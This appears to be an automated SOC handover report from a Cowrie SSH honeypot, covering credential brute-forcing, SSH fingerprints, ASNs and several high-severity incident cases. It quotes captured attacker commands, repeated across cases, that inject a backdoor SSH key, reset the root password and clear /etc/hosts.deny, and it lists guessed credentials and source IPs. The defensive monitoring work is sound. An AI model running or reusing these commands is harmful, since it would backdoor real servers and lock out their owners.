# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-24 |
| **Generated At** | 2026-04-24T22:43:25Z |
| **Shift Time** | 22:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **245** |
| Confirmed Threats | **242** |
| False Positives Filtered | **3** (1.2%) |
| Unique Attacker IPs | **20** |
| Countries of Origin | **7** |
| High Severity Cases | **94** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **151** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **201** |
| Unique Credential Pairs | **93** |
| Unique Usernames | **38** |
| Unique Passwords | **87** |
| Successful Auth Pairs | **55** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 94 |
| `345gs5662d34` | 44 |
| `ubuntu` | 9 |
| `user` | 5 |
| `admin` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 45 |
| `345gs5662d34` | 44 |
| `123456` | 6 |
| `P@ssw0rd` | 3 |
| `123` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 45 |
| `345gs5662d34` | `345gs5662d34` | 44 |
| `root` | `Aa112211.` | 3 |
| `root` | `1qazcde3!@#` | 2 |
| `admin1` | `P@ssw0rd` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1qazcde3!@#` | `14.103.104.36` | 2026-04-24T21:03:17 |
| `root` | `Root2026#$` | `14.103.104.36` | 2026-04-24T21:09:49 |
| `root` | `Abcd123456789!@` | `148.216.28.11` | 2026-04-24T21:28:31 |
| `root` | `3245gs5662d34` | `148.216.28.11` | 2026-04-24T21:28:38 |
| `root` | `1qazcde3!@#` | `148.216.28.11` | 2026-04-24T21:30:11 |
| `root` | `a12345678b` | `148.216.28.11` | 2026-04-24T21:30:59 |
| `root` | `qwerty12345` | `148.216.28.11` | 2026-04-24T21:32:31 |
| `root` | `Passw0rd$` | `148.216.28.11` | 2026-04-24T21:34:00 |
| `root` | `root888.` | `148.216.28.11` | 2026-04-24T21:36:19 |
| `root` | `Qazwsx123456789#` | `148.216.28.11` | 2026-04-24T21:37:06 |
| `root` | `qazwsx001!!` | `148.216.28.11` | 2026-04-24T21:39:24 |
| `root` | `Root06!` | `148.216.28.11` | 2026-04-24T21:40:54 |
| `root` | `Root2026#$` | `148.216.28.11` | 2026-04-24T21:41:41 |
| `root` | `Airtel@123` | `37.58.136.133` | 2026-04-24T21:42:16 |
| `root` | `3245gs5662d34` | `37.58.136.133` | 2026-04-24T21:42:20 |
| `root` | `Abcd123456.` | `148.216.28.11` | 2026-04-24T21:42:30 |
| `root` | `myfriend` | `37.58.136.133` | 2026-04-24T21:43:02 |
| `root` | `nPSpP4PBW0` | `148.216.28.11` | 2026-04-24T21:43:19 |
| `root` | `Admin123!@#` | `148.216.28.11` | 2026-04-24T21:45:38 |
| `root` | `2glehe5t24th1issZs` | `37.58.136.133` | 2026-04-24T21:45:38 |
| `root` | `Lr@123456` | `37.58.136.133` | 2026-04-24T21:45:51 |
| `root` | `Aa112211.` | `148.216.28.11` | 2026-04-24T21:46:23 |
| `root` | `MoeClub.org` | `37.58.136.133` | 2026-04-24T21:47:27 |
| `root` | `odoo@123` | `37.58.136.133` | 2026-04-24T21:47:54 |
| `root` | `house123` | `37.58.136.133` | 2026-04-24T21:48:07 |
| `root` | `Root12345!!` | `120.203.25.201` | 2026-04-24T22:10:40 |
| `root` | `Zz123456789` | `120.203.25.201` | 2026-04-24T22:11:05 |
| `root` | `root@12` | `120.203.25.201` | 2026-04-24T22:12:09 |
| `root` | `3245gs5662d34` | `120.203.25.201` | 2026-04-24T22:12:15 |
| `root` | `Galaxy@123` | `120.203.25.201` | 2026-04-24T22:12:20 |
| `root` | `guest2024` | `120.203.25.201` | 2026-04-24T22:12:30 |
| `root` | `Qwe123!@#` | `120.203.25.201` | 2026-04-24T22:13:08 |
| `root` | `Aa112211.` | `120.203.25.201` | 2026-04-24T22:13:39 |
| `root` | `123456Ww` | `120.203.25.201` | 2026-04-24T22:13:59 |
| `root` | `qwe2025!` | `120.203.25.201` | 2026-04-24T22:14:24 |
| `root` | `root123456@` | `120.203.25.201` | 2026-04-24T22:14:33 |
| `root` | `Pa$$w0rd2025` | `120.203.25.201` | 2026-04-24T22:14:42 |
| `root` | `nPSpP4PBW0` | `120.203.25.201` | 2026-04-24T22:14:51 |
| `root` | `root999!@#` | `114.98.230.202` | 2026-04-24T22:17:19 |
| `root` | `3245gs5662d34` | `114.98.230.202` | 2026-04-24T22:17:26 |
| `root` | `Aa112211.` | `114.98.230.202` | 2026-04-24T22:19:01 |
| `root` | `qazwsx1234!!` | `114.98.230.202` | 2026-04-24T22:22:33 |
| `root` | `123456QWE` | `114.98.230.202` | 2026-04-24T22:27:49 |
| `root` | `Root1111!@#` | `114.98.230.202` | 2026-04-24T22:29:34 |
| `root` | `Ww123456@` | `114.98.230.202` | 2026-04-24T22:31:22 |
| `root` | `123456QWE` | `86.238.165.111` | 2026-04-24T22:34:26 |
| `root` | `3245gs5662d34` | `86.238.165.111` | 2026-04-24T22:34:31 |
| `root` | `saqib` | `114.98.230.202` | 2026-04-24T22:34:53 |
| `root` | `qazwsx1234!!` | `86.238.165.111` | 2026-04-24T22:36:12 |
| `root` | `Admin1!@#` | `211.254.212.59` | 2026-04-24T22:37:58 |
| `root` | `3245gs5662d34` | `211.254.212.59` | 2026-04-24T22:38:01 |
| `root` | `Pa$$w0rd2025` | `211.254.212.59` | 2026-04-24T22:39:54 |
| `root` | `ZAQ!2wsx54321..` | `114.98.230.202` | 2026-04-24T22:40:14 |
| `root` | `Ww123456@` | `86.238.165.111` | 2026-04-24T22:40:31 |
| `root` | `Root1111!@#` | `86.238.165.111` | 2026-04-24T22:41:23 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **245** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 239 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 157 | 5 |
| `03a80b21afa8...` | Modern SSH client | 77 | 7 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 157 | 5 | libssh-based |
| `03a80b21afa8...` | libssh | 77 | 7 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 3 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 45 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:MsQPDRAjmlf3"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.104.36`, `120.203.25.201`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `37.58.136.133`, `148.216.28.11`, `86.238.165.111`, `211.254.212.59`, `120.203.25.201`, `114.98.230.202`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **20** |
| Unique ASNs | **17** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS16223` | MAXNET TELECOM, LTD | 1 | LOW |
| `AS3215` | Orange S.A. | 1 | HIGH |
| `AS16347` | ADISTA SAS | 1 | HIGH |
| `AS8151` | UNINET | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (94)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ee67d6f9ca55

| Field | Detail |
|---|---|
| **Source IP** | `14.103.104[.]36` |
| **First Seen** | 2026-04-24 21:03 |
| **Last Seen** | 2026-04-24 21:03 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:MsQPDRAjmlf3"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:03:14` | `cowrie.session.connect` |
| `2026-04-24 21:03:14` | `cowrie.client.version` |
| `2026-04-24 21:03:14` | `cowrie.client.kex` |
| `2026-04-24 21:03:17` | `cowrie.login.success` |
| `2026-04-24 21:03:17` | `cowrie.session.params` |
| `2026-04-24 21:03:17` | `cowrie.command.input` |
| `2026-04-24 21:03:17` | `cowrie.command.failed` |
| `2026-04-24 21:03:17` | `cowrie.log.closed` |
| `2026-04-24 21:03:19` | `cowrie.session.params` |
| `2026-04-24 21:03:19` | `cowrie.command.input` |
| `2026-04-24 21:03:20` | `cowrie.session.file_download` |
| `2026-04-24 21:03:20` | `cowrie.log.closed` |
| `2026-04-24 21:03:32` | `cowrie.session.params` |
| `2026-04-24 21:03:32` | `cowrie.command.input` |
| `2026-04-24 21:03:32` | `cowrie.log.closed` |
| `2026-04-24 21:03:33` | `cowrie.session.params` |
| `2026-04-24 21:03:33` | `cowrie.command.input` |
| `2026-04-24 21:03:33` | `cowrie.log.closed` |
| `2026-04-24 21:03:33` | `cowrie.session.params` |
| `2026-04-24 21:03:33` | `cowrie.command.input` |
| `2026-04-24 21:03:33` | `cowrie.session.file_download` |
| `2026-04-24 21:03:33` | `cowrie.log.closed` |
| `2026-04-24 21:03:34` | `cowrie.session.params` |
| `2026-04-24 21:03:34` | `cowrie.command.input` |
| `2026-04-24 21:03:34` | `cowrie.log.closed` |
| `2026-04-24 21:03:34` | `cowrie.session.params` |
| `2026-04-24 21:03:34` | `cowrie.command.input` |
| `2026-04-24 21:03:34` | `cowrie.log.closed` |
| `2026-04-24 21:03:35` | `cowrie.session.params` |
| `2026-04-24 21:03:35` | `cowrie.command.input` |
| `2026-04-24 21:03:35` | `cowrie.command.input` |
| `2026-04-24 21:03:35` | `cowrie.log.closed` |
| `2026-04-24 21:03:35` | `cowrie.session.params` |
| `2026-04-24 21:03:35` | `cowrie.command.input` |
| `2026-04-24 21:03:35` | `cowrie.log.closed` |
| `2026-04-24 21:03:36` | `cowrie.session.params` |
| `2026-04-24 21:03:36` | `cowrie.command.input` |
| `2026-04-24 21:03:36` | `cowrie.log.closed` |
| `2026-04-24 21:03:36` | `cowrie.session.params` |
| `2026-04-24 21:03:36` | `cowrie.command.input` |
| `2026-04-24 21:03:36` | `cowrie.log.closed` |
| `2026-04-24 21:03:37` | `cowrie.session.params` |
| `2026-04-24 21:03:37` | `cowrie.command.input` |
| `2026-04-24 21:03:37` | `cowrie.log.closed` |
| `2026-04-24 21:03:37` | `cowrie.session.params` |
| `2026-04-24 21:03:37` | `cowrie.command.input` |
| `2026-04-24 21:03:37` | `cowrie.log.closed` |
| `2026-04-24 21:03:38` | `cowrie.session.params` |
| `2026-04-24 21:03:38` | `cowrie.command.input` |
| `2026-04-24 21:03:38` | `cowrie.log.closed` |
| `2026-04-24 21:03:38` | `cowrie.session.params` |
| `2026-04-24 21:03:38` | `cowrie.command.input` |
| `2026-04-24 21:03:38` | `cowrie.log.closed` |
| `2026-04-24 21:03:38` | `cowrie.session.params` |
| `2026-04-24 21:03:38` | `cowrie.command.input` |
| `2026-04-24 21:03:39` | `cowrie.log.closed` |
| `2026-04-24 21:03:39` | `cowrie.session.params` |
| `2026-04-24 21:03:39` | `cowrie.command.input` |
| `2026-04-24 21:03:39` | `cowrie.log.closed` |
| `2026-04-24 21:03:39` | `cowrie.session.params` |
| `2026-04-24 21:03:39` | `cowrie.command.input` |
| `2026-04-24 21:03:40` | `cowrie.log.closed` |
| `2026-04-24 21:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.104[.]36` to AbuseIPDB if not already reported
- [ ] Block `14.103.104[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-996efb592068

| Field | Detail |
|---|---|
| **Source IP** | `14.103.104[.]36` |
| **First Seen** | 2026-04-24 21:09 |
| **Last Seen** | 2026-04-24 21:10 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:9w4UhvC15f7A"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:09:48` | `cowrie.session.connect` |
| `2026-04-24 21:09:48` | `cowrie.client.version` |
| `2026-04-24 21:09:48` | `cowrie.client.kex` |
| `2026-04-24 21:09:49` | `cowrie.login.success` |
| `2026-04-24 21:09:49` | `cowrie.session.params` |
| `2026-04-24 21:09:49` | `cowrie.command.input` |
| `2026-04-24 21:09:49` | `cowrie.command.failed` |
| `2026-04-24 21:09:49` | `cowrie.log.closed` |
| `2026-04-24 21:09:49` | `cowrie.session.params` |
| `2026-04-24 21:09:49` | `cowrie.command.input` |
| `2026-04-24 21:09:50` | `cowrie.session.file_download` |
| `2026-04-24 21:09:50` | `cowrie.log.closed` |
| `2026-04-24 21:10:02` | `cowrie.session.params` |
| `2026-04-24 21:10:02` | `cowrie.command.input` |
| `2026-04-24 21:10:02` | `cowrie.log.closed` |
| `2026-04-24 21:10:02` | `cowrie.session.params` |
| `2026-04-24 21:10:02` | `cowrie.command.input` |
| `2026-04-24 21:10:02` | `cowrie.log.closed` |
| `2026-04-24 21:10:03` | `cowrie.session.params` |
| `2026-04-24 21:10:03` | `cowrie.command.input` |
| `2026-04-24 21:10:03` | `cowrie.session.file_download` |
| `2026-04-24 21:10:03` | `cowrie.log.closed` |
| `2026-04-24 21:10:04` | `cowrie.session.params` |
| `2026-04-24 21:10:04` | `cowrie.command.input` |
| `2026-04-24 21:10:04` | `cowrie.log.closed` |
| `2026-04-24 21:10:04` | `cowrie.session.params` |
| `2026-04-24 21:10:04` | `cowrie.command.input` |
| `2026-04-24 21:10:04` | `cowrie.log.closed` |
| `2026-04-24 21:10:04` | `cowrie.session.params` |
| `2026-04-24 21:10:04` | `cowrie.command.input` |
| `2026-04-24 21:10:04` | `cowrie.command.input` |
| `2026-04-24 21:10:05` | `cowrie.log.closed` |
| `2026-04-24 21:10:05` | `cowrie.session.params` |
| `2026-04-24 21:10:05` | `cowrie.command.input` |
| `2026-04-24 21:10:05` | `cowrie.log.closed` |
| `2026-04-24 21:10:05` | `cowrie.session.params` |
| `2026-04-24 21:10:05` | `cowrie.command.input` |
| `2026-04-24 21:10:05` | `cowrie.log.closed` |
| `2026-04-24 21:10:06` | `cowrie.session.params` |
| `2026-04-24 21:10:06` | `cowrie.command.input` |
| `2026-04-24 21:10:06` | `cowrie.log.closed` |
| `2026-04-24 21:10:06` | `cowrie.session.params` |
| `2026-04-24 21:10:06` | `cowrie.command.input` |
| `2026-04-24 21:10:06` | `cowrie.log.closed` |
| `2026-04-24 21:10:07` | `cowrie.session.params` |
| `2026-04-24 21:10:07` | `cowrie.command.input` |
| `2026-04-24 21:10:07` | `cowrie.log.closed` |
| `2026-04-24 21:10:07` | `cowrie.session.params` |
| `2026-04-24 21:10:07` | `cowrie.command.input` |
| `2026-04-24 21:10:07` | `cowrie.log.closed` |
| `2026-04-24 21:10:08` | `cowrie.session.params` |
| `2026-04-24 21:10:08` | `cowrie.command.input` |
| `2026-04-24 21:10:08` | `cowrie.log.closed` |
| `2026-04-24 21:10:08` | `cowrie.session.params` |
| `2026-04-24 21:10:08` | `cowrie.command.input` |
| `2026-04-24 21:10:08` | `cowrie.log.closed` |
| `2026-04-24 21:10:09` | `cowrie.session.params` |
| `2026-04-24 21:10:09` | `cowrie.command.input` |
| `2026-04-24 21:10:09` | `cowrie.log.closed` |
| `2026-04-24 21:10:09` | `cowrie.session.params` |
| `2026-04-24 21:10:09` | `cowrie.command.input` |
| `2026-04-24 21:10:09` | `cowrie.log.closed` |
| `2026-04-24 21:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.104[.]36` to AbuseIPDB if not already reported
- [ ] Block `14.103.104[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01baa4e788c3

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:28 |
| **Last Seen** | 2026-04-24 21:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:28:30` | `cowrie.session.connect` |
| `2026-04-24 21:28:30` | `cowrie.client.version` |
| `2026-04-24 21:28:30` | `cowrie.client.kex` |
| `2026-04-24 21:28:31` | `cowrie.login.success` |
| `2026-04-24 21:28:32` | `cowrie.session.params` |
| `2026-04-24 21:28:32` | `cowrie.command.input` |
| `2026-04-24 21:28:32` | `cowrie.command.failed` |
| `2026-04-24 21:28:32` | `cowrie.log.closed` |
| `2026-04-24 21:28:33` | `cowrie.session.params` |
| `2026-04-24 21:28:33` | `cowrie.command.input` |
| `2026-04-24 21:28:33` | `cowrie.session.file_download` |
| `2026-04-24 21:28:33` | `cowrie.log.closed` |
| `2026-04-24 21:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfa0dffa92fe

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:28 |
| **Last Seen** | 2026-04-24 21:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:28:36` | `cowrie.session.connect` |
| `2026-04-24 21:28:36` | `cowrie.client.version` |
| `2026-04-24 21:28:36` | `cowrie.client.kex` |
| `2026-04-24 21:28:38` | `cowrie.login.success` |
| `2026-04-24 21:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fadf6ff3013

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:30 |
| **Last Seen** | 2026-04-24 21:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:30:09` | `cowrie.session.connect` |
| `2026-04-24 21:30:09` | `cowrie.client.version` |
| `2026-04-24 21:30:10` | `cowrie.client.kex` |
| `2026-04-24 21:30:11` | `cowrie.login.success` |
| `2026-04-24 21:30:11` | `cowrie.session.params` |
| `2026-04-24 21:30:11` | `cowrie.command.input` |
| `2026-04-24 21:30:11` | `cowrie.command.failed` |
| `2026-04-24 21:30:12` | `cowrie.log.closed` |
| `2026-04-24 21:30:12` | `cowrie.session.params` |
| `2026-04-24 21:30:12` | `cowrie.command.input` |
| `2026-04-24 21:30:12` | `cowrie.session.file_download` |
| `2026-04-24 21:30:12` | `cowrie.log.closed` |
| `2026-04-24 21:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7a280063b53

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:30 |
| **Last Seen** | 2026-04-24 21:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:30:16` | `cowrie.session.connect` |
| `2026-04-24 21:30:16` | `cowrie.client.version` |
| `2026-04-24 21:30:16` | `cowrie.client.kex` |
| `2026-04-24 21:30:17` | `cowrie.login.success` |
| `2026-04-24 21:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

